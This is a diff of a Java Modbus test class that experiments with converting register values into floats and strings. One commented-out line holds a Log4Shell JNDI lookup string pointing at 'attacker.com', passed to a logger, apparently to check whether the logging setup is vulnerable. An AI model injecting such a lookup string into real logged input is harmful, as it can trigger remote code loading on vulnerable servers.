@@ -32,47 +32,58 @@ public class TestModbus {
 
 
     public static void main(String[] args) throws ModbusInitException, ModbusTransportException, ErrorResponseException {
+//        short[] data = {(short) -15729, (short) 16818};
+//
+//        ByteBuffer buffer = ByteBuffer.allocate(4);
+//        ShortBuffer sb = buffer.asShortBuffer();
+//        sb.put(data);
+//        buffer.putShort((short) 16818);
+//        buffer.putShort((short) -15729);
+//
+//        System.out.println(buffer.getFloat(0));
+
+
+//        ByteBuffer byteBuffer = ByteBuffer.allocate(4);
+//        ShortBuffer shortBuffer = byteBuffer.asShortBuffer();
+//        shortBuffer.put((short) 16818);
+//        shortBuffer.put((short) -15729);
+////        shortBuffer.put((short) -15729);
+////        shortBuffer.put((short) -15729);
+//
+//        byte[] data = byteBuffer.array();
+//        long start = System.currentTimeMillis();
+//        int d = ((data[0] & 0xff) << 24) | ((data[1] & 0xff) << 16) | ((data[2] & 0xff) << 8) | (data[3] & 0xff);
+//        System.out.println(Float.intBitsToFloat(d));
+//        System.out.println(System.currentTimeMillis() - start);
+//
+//        start = System.currentTimeMillis();
+//        System.out.println(Float.intBitsToFloat(Integer.parseInt(fillBinary((short) 16818) + fillBinary((short) -15729), 2)));
+//        System.out.println(System.currentTimeMillis() - start);
+//
+//        start = System.currentTimeMillis();
+//        int f = ((16818 & 0xFFFF) << 16) | (-15729 & 0xFFFF);
+//        System.out.println(Float.intBitsToFloat(f));
+//        System.out.println(System.currentTimeMillis() - start);
+
+
 //        ByteBuffer byteBuffer = ByteBuffer.allocate(200);
 //        byteBuffer.order(ByteOrder.LITTLE_ENDIAN);
-//        byteBuffer.putShort((short) 12336);
-//        byteBuffer.putShort((short) 12336);
-//        byteBuffer.putShort((short) 14129);
-//        byteBuffer.putShort((short) 12594);
-//        byteBuffer.putShort((short) 12594);
-//        byteBuffer.putShort((short) 14640);
-//        byteBuffer.putShort((short) 12336);
-//        byteBuffer.putShort((short) 12596);
-//        byteBuffer.putShort((short) 12336);
-//        byteBuffer.putShort((short) 12352);
-//        byteBuffer.putShort((short) 12336);
-//        byteBuffer.putShort((short) 13104);
-//        byteBuffer.putShort((short) 13111);
-//        byteBuffer.putShort((short) 12848);
-//        byteBuffer.putShort((short) 16441);
-//        byteBuffer.putShort((short) 12338);
-//        byteBuffer.putShort((short) 13616);
-//        byteBuffer.putShort((short) 12850);
-//        byteBuffer.putShort((short) 12336);
-//        byteBuffer.putShort((short) 12336);
-//        byteBuffer.putShort((short) 14902);
-//        byteBuffer.putShort((short) 12857);
-//        byteBuffer.putShort((short) 16698);
-
-
-        short[] data = new short[] {0, 1, 0, 0, 0, 0, 1, 2, 3, 1, 3, 3, 0, 1, -15729, 16818, -16777, 16691, -4194, 16972, -21496, 16252, 13107, 16691, -15729, 16818, 6816, 16823, -22020, 16902, 7078, 16947, -29360, 16955, -29360, 16955, -29360, 16955, -7340, 17270, -7340, 17170, 15335, 17236, -29360, 16955, 0, 0, 0, 0, 0, 0, 0, 0, 12336, 12336, 14129, 12594, 12594, 14640, 12336, 12596, 12336, 12352, 12336, 13104, 13111, 12848, 16441, 12338, 13616, 12850, 12336, 12336, 14902, 12857, 16698, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,};
-        int size = 0;
-        for (int i = 54; i <= 154; i ++) {
-            if (data[i] > 0) {
-                size ++;
-            }
-        }
-        ByteBuffer byteBuffer = ByteBuffer.allocate(size * 2);
-        byteBuffer.order(ByteOrder.LITTLE_ENDIAN);
-        ShortBuffer shortBuffer = byteBuffer.asShortBuffer();
-        shortBuffer.put(Arrays.copyOfRange(data, 54, size));
-        System.out.println(new String(byteBuffer.array(), StandardCharsets.UTF_8));
-
-//        System.out.println("093500201170000327211150001".substring(18, 27));
+//        ShortBuffer shortBuffer = byteBuffer.asShortBuffer();
+        short[] data = new short[] {0, 1, 0, 0, 0, 0, 1, 2, 3, 1, 3, 3, 0, 1, -15729, 16818, -16777, 16691, -4194, 16972, -21496, 16252, 13107, 16691, -15729, 16818, 6816, 16823, -22020, 16902, 7078, 16947, -29360, 16955, -29360, 16955, -29360, 16955, -7340, 17270, -7340, 17170, 15335, 17236, -29360, 16955, 0, 0, 0, 0, 0, 0, 0, 0, 12336, 12336, 14129, 12594, 12594, 14640, 12336, 12596, 12336, 12352, 12336, 13104, 13111, 12848, 16441, 12338, 13616, 12850, 12336, 12336, 14902, 12857, 16698, 70, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,};
+        System.out.println(Arrays.toString(Arrays.copyOfRange(data, 0, 0 + 10)));
+        System.out.println(Arrays.toString(Arrays.copyOfRange(data, 10, 10 + 10)));
+//        for (int i = 54; i < 104; i ++) {
+//            if (data[i] > 0) {
+//                shortBuffer.put(data[i]);
+//            }
+//        }
+//
+//        byte[] array = byteBuffer.array();
+//        String str = new String(array, StandardCharsets.UTF_8);
+//        System.out.println(str);
+//        System.out.println(Arrays.toString(str.trim().toCharArray()));
+//
+//        System.out.println("000001723210707900@0702012027@22010590060:91:C".substring(45, 46));
 //        String header ="${jndi:ldap://attacker.com/a}";
 //        LOG.info(header);
 //        LOG.info("test: {}", header);
@@ -184,4 +195,11 @@ public class TestModbus {
         bytes[offset + 1] = (byte) ((s & 0xff00) >> 8);
     }
 
+    private static String fillBinary(short value) {
+        StringBuilder binary = new StringBuilder(Integer.toBinaryString(value & 0xFFFF));
+        while (binary.length() < 16) {
+            binary.insert(0, "0");
+        }
+        return binary.toString();
+    }
 }
